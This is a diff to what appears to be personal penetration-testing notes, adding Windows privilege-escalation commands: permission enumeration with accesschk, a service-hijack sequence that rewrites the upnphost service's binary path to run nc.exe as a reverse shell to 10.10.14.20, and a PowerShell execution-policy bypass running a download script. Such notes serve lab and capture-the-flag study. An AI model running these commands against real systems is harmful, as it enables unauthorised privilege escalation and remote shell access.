@@ -192,6 +192,16 @@
    - Still busy gathering info... Have this so far:
    - ```cacls C:\WINDOWS\system32\``` This displays permissions on folder & same for file eg: cacls test.txt
    - icacls for newer Windows versions (I think Vista upwards)
+   - ```ps> runas /user:administrator cmd.exe```
+   - ```accesschk.exe -ucqv *```
+   - Hijacking
+	  - ```sc config upnphost binpath= "C:\inetpub\nc.exe -nv 10.10.14.20 5555 -e C:\WINDOWS\System32\cmd.exe"```
+	  - ```sc config upnphost obj= ".\LocalSystem" password= ""```
+	  - ```sc qc upnphost```
+	  - ```net start upnphost```
+	  - Check dependancies
+   - Some PowerShell
+	  - ```powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1```
 
 <H2>Getting In</H2>
 
